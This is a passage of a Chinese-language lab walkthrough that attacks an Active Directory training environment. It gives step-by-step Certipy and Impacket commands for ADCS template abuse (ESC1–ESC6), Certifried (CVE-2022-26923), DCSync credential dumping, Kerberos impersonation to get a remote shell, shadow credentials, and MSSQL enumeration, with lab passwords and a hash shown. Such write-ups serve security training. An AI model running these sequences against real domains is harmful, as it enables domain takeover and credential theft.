          Extended Key Usage                  : Client Authentication
          Requires Manager Approval           : False
          Requires Key Archival               : False
          Authorized Signatures Required      : 0
          Validity Period                     : 1 year
          Renewal Period                      : 6 weeks
          Minimum RSA Key Length              : 2048
          Permissions
            Enrollment Permissions
              Enrollment Rights               : ESSOS.LOCAL\Domain Users
            Object Control Permissions
              Owner                           : ESSOS.LOCAL\Enterprise Admins
              Full Control Principals         : ESSOS.LOCAL\Domain Admins
                                                ESSOS.LOCAL\Local System
                                                ESSOS.LOCAL\Enterprise Admins
              Write Owner Principals          : ESSOS.LOCAL\Domain Admins
                                                ESSOS.LOCAL\Local System
                                                ESSOS.LOCAL\Enterprise Admins
              Write Dacl Principals           : ESSOS.LOCAL\Domain Admins
                                                ESSOS.LOCAL\Local System
                                                ESSOS.LOCAL\Enterprise Admins
              Write Property Principals       : ESSOS.LOCAL\Domain Admins
                                                ESSOS.LOCAL\Local System
                                                ESSOS.LOCAL\Enterprise Admins
          [!] Vulnerabilities
            ESC1                              : 'ESSOS.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
  * 我们可以看到 ESC1 的漏洞模板 :
    * Enrollment rights to all domain users
    * Client authentication
    * And Enrollee supplies subject
  * 以及ESC2的
  * 然后导入到bloodhound查看
  * 作者使用的是ubuntu(?)，其命令如下
    cd /opt/tools
    wget https://github.com/ly4k/BloodHound/releases/download/v4.2.0-ly4k/BloodHound-linux-x64.zip
    unzip BloodHound-linux-x64.zip -d BloodHound4.2-ly4k
    rm BloodHound-linux-x64.zip
    neo4j start
    /opt/tools/BloodHound4.2-ly4k/BloodHound-linux-x64/BloodHound  --no-sandbox --disable-dev-shm-usage
  * 我是用的是mac 命令大差不大
    https://github.com/ly4k/BloodHound/releases/download/v4.2.0-ly4k/BloodHound-darwin-arm64.zip
  * 导入certipy生成的zip
速览一下 : PKI->Find certificate authority, 选中 certificate authority然后点击 : “see
enabled templates”
这个图不知道怎么查出来的
## ADCS - exploitation
### ADCS - ESC1
  * 枚举(跟上边相同
    certipy find -u PI:EMAIL -p 'horse' -dc-ip 192.168.56.12
  * 查询证书
    * target: ca server
    * tempalte : the vulnerable template
    * upn : the target user we want to impersonate
    certipy req -u PI:EMAIL -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn PI:EMAIL
  * 使用我们得到的private key来认证
    certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
### ADCS - ESC2 & ESC3
> 正如 certipy 页面中所说：“ESC2 是证书模板可用于任何目的的时候。 由于该证书可用于任何目的，因此它可用于大多数证书模板的与 ESC3
> 相同的技术。”
>
>   * 让我们尝试使用 ESC2 来区分这两种攻击：
>
  * 查询cert
    certipy req -u PI:EMAIL -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
  * 使用刚得到的Certificate Request Agent certificate继续查询
    certipy req -u PI:EMAIL -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
  * 认证
    certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
  * 我们也可以用ESC3-CRA和ESC3来做同样的事
    certipy req -u PI:EMAIL -p 'horse' -target 192.168.56.23 -template ESC3-CRA -ca ESSOS-CA
    certipy req -u PI:EMAIL -p 'horse' -target 192.168.56.23 -template ESC3 -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
    certipy auth -pfx administrator.pfx -username administrator -domain essos.local -dc-ip 192.168.56.12
### ADCS - ESC4
上边这个图不知道怎么查出来的 只在analyse里找到了下边这个
  * 获取 ESC4 模板并使用我们获得的 genericWrite 权限将其更改为容易受到 ESC1 技术的攻击。 （我们没有在这里设置目标，因为我们以 ldap 为目标）
    certipy template -u PI:EMAIL -p 'horse' -template ESC4 -save-old -debug
  * 基于修改的ESC4模板上利用ESC1
    certipy req -u PI:EMAIL -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn PI:EMAIL
  * 使用pfx认证
    certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
  * 回滚模板设置
    certipy template -u PI:EMAIL -p 'horse' -template ESC4 -configuration ESC4.json
### ADCS - ESC6
> 正如 certipy 页面上所说：“ESC6 是 CA 指定 EDITF_ATTRIBUTESUBJECTALTNAME2 标志时。
> 尽管有证书模板的配置，此标志允许登记者在所有证书上指定任意 SAN。”
>
>   * 因为 ESSOS-CA 容易受到 ESC6 的攻击，我们可以进行 ESC1 攻击，但使用用户模板而不是 ESC1 模板，即使用户模板将
> Enrollee Supplies Subject 设置为 false。
>
    certipy req -u PI:EMAIL -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn PI:EMAIL
    certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
## Certifried - CVE-2022–26923
> Oliver Lyak 找到了一种将低权限用户的权限提升到活动目录的方法。 这包括更改创建的计算机上的 dnsHostName 属性。
> 这个想法看起来和samAccountName漏洞一样，它是对认证名称的混淆
  * 使用域用户创建一个帐户并设置一个假的 DNS 名称作为域控制器。
    certipy account create -u PI:EMAIL -p 'horse' -user 'certifriedpc' -pass 'certifriedpass' -dns 'meereen.essos.local'
  * 在模板机器上使用创建的计算机请求证书
    certipy req -u 'certifriedpc$'@essos.local -p 'certifriedpass' -target braavos.essos.local -ca ESSOS-CA -template Machine
  * 使用证书作为 meereen（dc）进行身份验证
    certipy auth -pfx meereen.pfx -username 'meereen$' -domain essos.local -dc-ip 192.168.56.12
  * 导出ndts
    export KRB5CCNAME=meereen.ccache
    python secretsdump.py -k -no-pass -just-dc-user daenerys.targaryen ESSOS.LOCAL/'meereen$'@meereen.essos.local
  * 删除创建的计算机
    certipy account delete -u PI:EMAIL -hashes 'aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a' -user 'certifriedpc'
  * 好的，但现在假设一下，由于 dc 上的安全产品，您无法使用 secretdump 进行 dcsync，或者您只想直接在 DC 上获取 shell。 让我们尝试获得一个 shell。
  * 我们获得了 DC 的 TGT（与0x05中的 samaccountname 完全一样）因此我们将使用 impacket getST 来模拟管理员并获取 st 以管理员身份访问 DC 
  * 记得使用好的 impacket pull request 来使用它，参阅 0x05部分进行安装
    export KRB5CCNAME=meereen.ccache
    python3 myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
    export KRB5CCNAME=PI:EMAIL@ESSOS.LOCAL.ccache
    python wmiexec.py -k @meereen.essos.local
  * 我们也可以做winrm同样的事情，以更加合法
    export KRB5CCNAME=meereen.ccache
    python3 myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'HTTP/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'
    export KRB5CCNAME=PI:EMAIL@ESSOS.LOCAL.ccache
    evil-winrm -i meereen.essos.local -r ESSOS.LOCAL
服务器没联网 且没有ruby环境 盗一下WP的图
## Shadow Credentials
>
> 攻击者在获取到一定权限的账户（域管理员、特殊组的成员，拥有GenericAll或GenericWrite权限等）后，编辑指定对象（用户或计算机）的msDS-> KeyCredentialLink以获得对目标对象的持久和隐蔽的访问
>
>   * 影子凭据攻击包括使用用户或计算机上的 **GenericAll** 或 **GenericWrite** 权限来设置属性 msDS-> KeyCredentialLink。 key-trust-account-mapping-for-takeover-8ee1a53566ab>
> 
>
  * 当您可以对另一个用户进行Write时，此攻击非常有用。
  * 使用 genericWrite 你只能做：
    * 目标 Kerberoasting：向用户添加 SPN，执行 kerberoasting，取消设置 spn。 但用户密码必须对kerberoasting 攻击起作用。
    * 设置登录脚本：更改 ldap 参数以设置登录脚本。 但这意味着用户登录到他的计算机、smb 服务器或共享以提供脚本并设置绕过安全解决方案的脚本）
    * 影子凭据：我们想要进行的攻击，我们需要域上的证书服务
  * 使用 GenericAll，您可以：
    * ForceChangePassword ：但在真正的渗透测试中，您不想通过更改密码来阻止用户。 这也不是很隐蔽。 所以如果你能用另一种方式做这很好:)
    * genericWrite 部分中可用的所有攻击。
  * 因此，如果在域上启用了 ADCS，并且我们获得了对 msDS-KeyCredentialLink 的写入权限，我们就可以进行影子凭据攻击以获得对用户帐户的直接访问权限。 在这种情况下，这似乎是一个真正的渗透测试的更好主意。
  * 可以使用certipy完成影子凭据（这种攻击也可以用 pywisker 完成）
    certipy shadow auto -u PI:EMAIL -p 'horse' -account 'viserys.targaryen'
  * 我们可以从 viserys 到 jorah 做同样的事情
# 0x07 MSSQL
现在让我们退后一步，回到 castelblack.north.sevenkingdoms.local 查看 MSSQL 服务器。
  * Before jump into this chapter, i have done some small configuration on the lab, to be sure you get it, you should pull the updates and play : ansible-playbook servers.yml to get the last mssql configuration.
  * This modifications are:
    * arya.stark execute as user dbo impersonate privilege on msdb
    * brandon.stark impersonate on jon.snow
## Enumerate the MSSQL servers
使用多种方法来枚举MSSQL服务器
### Impacket GetUserSPNs[.]py
  * 首先让我们尝试找出 MSSQL 服务器上具有 SPN 的用户
    python GetUserSPNs.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople
  * 在essos域上
    python GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
### nmap
    nmap -p 1433 -sV -sC 192.168.56.10-23
得到的结果一样，这两台机器存在mssql服务
  * castelblack.north.sevenkingdoms.local
  * braavos.essos.local
### CrackMapExec